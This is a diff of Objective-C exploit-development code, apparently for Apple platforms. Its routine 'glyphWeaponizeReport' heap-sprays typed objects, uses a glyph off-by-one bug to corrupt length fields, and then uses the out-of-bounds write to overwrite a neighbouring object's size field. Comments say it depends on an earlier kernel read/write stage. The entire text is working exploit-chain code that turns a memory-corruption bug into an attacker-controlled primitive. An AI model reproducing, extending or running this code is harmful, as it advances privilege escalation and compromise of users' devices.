@@ -1227,7 +1227,7 @@ cleanup:
 // ---------------------------------------------------------------------------
 // Typed object: u32 length fields + OOB report via Glyph ±1 pair
 // PREREQUISITE: KRW must be active (pe_v1 first) — walk goes through spray.
-// Fill: repeating 32-byte objects {u32 len=0x20; u32 tag; u8 data[24]}
+// Fill: repeating 32-byte objects {u32 len=0x20; u32 size=0x100; u8 data[24]}
 // Glyph ±1 pair corrupts a u32 length → ±65535 delta → OOB.
 // ---------------------------------------------------------------------------
 + (NSString *)glyphWeaponizeReport:(NSString *)forceName {
@@ -1245,14 +1245,14 @@ cleanup:
     if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
     int got = 0, holes = 0;
 
-    // Fill with typed 32-byte objects: u32 len=0x20, u32 tag, 24 bytes data
+    // Fill with typed 32-byte objects: u32 len=0x20, u32 size=0x100 (TARGET), 24 bytes data
     for (int i = 0; i < NBUFS; i++) {
         void *b = malloc(spraySz);
         if (!b) break;
         uint8_t *p = (uint8_t *)b;
         for (size_t o = 0; o + OBJ_SZ <= spraySz - 8; o += OBJ_SZ) {
-            *(uint32_t *)(p + o) = OBJ_LEN;           // length
-            *(uint32_t *)(p + o + 4) = 0x43464441;    // tag 'CFDA'
+            *(uint32_t *)(p + o) = OBJ_LEN;           // length (Glyph corrupts this)
+            *(uint32_t *)(p + o + 4) = 0x00000100;    // size TARGET (OOB write hits this)
             memset(p + o + 8, 0x41, OBJ_SZ - 8);      // data fill
         }
         *(uint64_t *)(p + spraySz - 8) = (uint64_t)i;
@@ -1331,12 +1331,12 @@ cleanup:
             hits++;
             int delta = (int)len - (int)OBJ_LEN;
             if (delta > 0) grew++; else shrank++;
-            uint32_t tag = *(uint32_t *)(b + o + 4);
+            uint32_t sz = *(uint32_t *)(b + o + 4);
             if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
             if (hits <= 8) {
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  OBJ HIT buf %d off=%zu  len: 0x%x->0x%08x (delta=%+d)  tag=0x%08x%s",
-                    i, o, OBJ_LEN, len, delta, tag,
+                    @"  OBJ HIT buf %d off=%zu  len: 0x%x->0x%08x (delta=%+d)  size=0x%08x%s",
+                    i, o, OBJ_LEN, len, delta, sz,
                     (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
             }
         }
@@ -1350,54 +1350,38 @@ cleanup:
     } else {
         scopeNote(r, [NSString stringWithFormat:@"  >>> %d typed object(s) corrupted: +%d grew / %d shrank",
                       hits, grew, shrank]);
-        // ---- OOB WRITE: corrupt next object's tag via grown length ----
-        // Object layout: [u32 len | u32 tag | u8 data[24]] = 32 bytes
-        // Data starts at obj+8. Next object's tag is at obj+36 = dataStart+28.
-        // With grown length 0x21 (33), write 33 bytes from dataStart → reaches next tag.
+        // ---- OOB WRITE: corrupt next object's SIZE via grown length ----
+        // Object layout: [u32 len | u32 size | u8 data[24]] = 32 bytes
+        // Data starts at obj+8. Next object's size is at obj+36 = dataStart+28.
         for (int i = 0; i < got && firstIdx >= 0; i += 2) {
             uint8_t *b = bufs[i];
             if (!b) continue;
             for (size_t o = 0; o + OBJ_SZ * 2 <= scanEnd; o += OBJ_SZ) {
                 uint32_t len = *(uint32_t *)(b + o);
                 if (len <= OBJ_LEN) continue;  // only GROWN
-                // Found grown object at offset o
                 uint8_t *dataStart = b + o + 8;
                 size_t maxSafe = spraySz - o - 8;
-                // Next object's tag is at dataStart + 28 (obj+36)
-                size_t tagOff = OBJ_SZ - 8 + 4;  // = 28
-                if (tagOff + 4 > maxSafe) continue;
+                size_t szOff = OBJ_SZ - 8 + 4;  // = 28 (next object's size field)
+                if (szOff + 4 > maxSafe) continue;
 
-                // Read next tag BEFORE write
-                uint32_t tagBefore = *(uint32_t *)(dataStart + tagOff);
+                uint32_t szBefore = *(uint32_t *)(dataStart + szOff);
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  OOB-WRITE: obj buf %d off %zu  len=0x%x  target: next tag @ data+%zu  before=0x%08x",
-                    i, o, len, tagOff, tagBefore]);
+                    @"  OOB-WRITE: obj buf %d off %zu  len=0x%x  target: next SIZE @ data+%zu  before=0x%08x",
+                    i, o, len, szOff, szBefore]);
 
-                // Write marker past object boundary
-                uint32_t marker = 0xDEADBEEF;
-                // Safe write: only if we have room
-                if (tagOff + 4 <= maxSafe) {
-                    *(uint32_t *)(dataStart + tagOff) = marker;
-
-                    // Read back
-                    uint32_t tagAfter = *(uint32_t *)(dataStart + tagOff);
+                uint32_t evilSize = 0x00000042;
+                if (szOff + 4 <= maxSafe) {
+                    *(uint32_t *)(dataStart + szOff) = evilSize;
+                    uint32_t szAfter = *(uint32_t *)(dataStart + szOff);
                     scopeNote(r, [NSString stringWithFormat:
-                        @"    wrote 0x%08x at data+%zu  readback=0x%08x", marker, tagOff, tagAfter]);
-
-                    if (tagAfter == marker) {
-                        scopeNote(r, @"  >>> OOB WRITE CONFIRMED — marker persisted past object boundary!");
-                        // Show hex context around the write
-                        NSMutableString *ctx = [NSMutableString string];
-                        size_t ctxStart = (tagOff > 8) ? tagOff - 8 : 0;
-                        for (size_t j = 0; j < 24 && ctxStart + j < maxSafe; j++)
-                            [ctx appendFormat:@"%02x ", dataStart[ctxStart + j]];
-                        scopeNote(r, [NSString stringWithFormat:@"    context @ data+%zu: %@", ctxStart, ctx]);
-                    } else {
-                        scopeNote(r, @"  >>> OOB WRITE: readback mismatch (compiler may have optimized)");
+                        @"    wrote 0x%08x at data+%zu  readback=0x%08x", evilSize, szOff, szAfter]);
+                    if (szAfter == evilSize) {
+                        scopeNote(r, @"  >>> SIZE FIELD CORRUPTED via OOB write — target acquired!");
+                        scopeNote(r, [NSString stringWithFormat:
+                            @"    size: 0x%08x -> 0x%08x (delta=%+d)", szBefore, szAfter,
+                            (int)szAfter - (int)szBefore]);
                     }
                 }
-
-                // Show what massive length enables
                 if (len > 0xFFFF) {
                     scopeNote(r, [NSString stringWithFormat:
                         @"  >>> MASSIVE OOB: len=0x%x enables write %u bytes past object", len, len - OBJ_LEN]);
